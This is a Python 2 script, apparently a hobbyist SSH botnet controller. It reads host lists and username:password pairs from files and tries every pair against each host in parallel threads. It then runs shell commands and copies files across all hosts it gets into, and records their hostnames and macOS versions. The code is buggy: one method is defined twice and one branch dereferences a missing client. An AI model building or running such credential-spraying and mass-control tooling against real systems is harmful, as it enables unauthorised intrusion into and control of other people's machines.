#!/usr/bin/python
import pxssh
from pexpect import *
import pexpect
import PySweeper
import sys
import time
import signal
from time import sleep
import threading

class Command:

    def __init__(self, command, output):
        self.command = command
        self.output = output

class Client:

    def __init__(self, host, user, password):
        self.commands = []
        self.host = host
        self.hostname = None
        self.user = user
        self.password = password
        self.version = None
        self.session = self.connect()

    def set_hostname(self, hostname):
        self.hostname = hostname

    def set_version(self, version):
        self.version = version

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            print_color("[+] Connection successful!", "green")
            return s
        except Exception, e:
            return None
            print_color("[-] Connection timed out.", "red")

    def store_command_data(self, command, output):
        self.commands.append(Command(command, output))

class Botnet:
    def __init__(self, ips, credentials):
        self.clients = []
        self.unconnected_hosts = []
        with open(ips) as f:
            self.ips = [x.strip() for x in f.readlines()]
        with open(credentials) as f:
            self.credentials = [x.strip().split(':') for x in f.readlines()]

    @staticmethod
    def login(ip, credentials, clients):
        for user, password in credentials:
            try:
                client = Client(ip, user, password)
            except:
                client = None
                print "hi"
            finally:
                if client.session is not None:
                    clients.append(client)

    def disconnect(self):
        for client in self.clients:
            client.session.logout()

    def connect(self):
        threads = []
        for ip in self.ips:
            t = threading.Thread(target=self.login, args=(ip, self.credentials, self.clients))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        threads = None

        for client in self.clients:
            client.session.sendline("echo $HOSTNAME")
            client.session.prompt()
            split_output = client.session.before.split("\n")
            client.set_hostname(split_output[1])
            client.session.sendline("sw_vers -productVersion")
            client.session.prompt()
            split_output = client.session.before.split("\n")
            client.set_version(split_output[1])

    def send_command(self, command, clients):
        for client in clients:
            client.session.sendline(command)
            client.session.prompt()
            split_output = client.session.before.split("\n")
            del split_output[0]
            output = ""
            for line in split_output:
                output += line + "\n"
            client.store_command_data(command, output)

    def send_command(self, command):
        for client in self.clients:
            client.session.sendline(command)
            client.session.prompt()
            split_output = client.session.before.split("\n")
            del split_output[0]
            output = ""
            for line in split_output:
                output += line + "\n"
            client.store_command_data(command, output)

    def send_file_or_folder(self, file_or_folder, to_location):
        for client in self.clients:
            client.session.sendline("scp -r " + file_or_folder + " " + client.user + "@" + client.host + ":" + to_location)
            client.session.prompt()
            client.session.sendline(client.password)

    def print_output(self):
        for client in self.clients:
            print "\n" + client.host
            for command in client.commands:
                print "\n" + command.command
                print "\n" + command.output

def print_color(text, color):
    if color is "green":
        print("\033[92m" + text + "\033[0m")
    elif color is "red":
        print("\033[91m" + text + "\033[0m")
    elif color is "yellow":
        print("\033[93m" + text + "\033[0m")
    else:
        print(text + "\nColor not found!")

def main():

    botnet = Botnet("/etc/ips", "/etc/pass")
    botnet.connect()
    botnet.send_command("ls -la")
    botnet.print_output()
    botnet.disconnect()

if __name__ == "__main__":
    main()
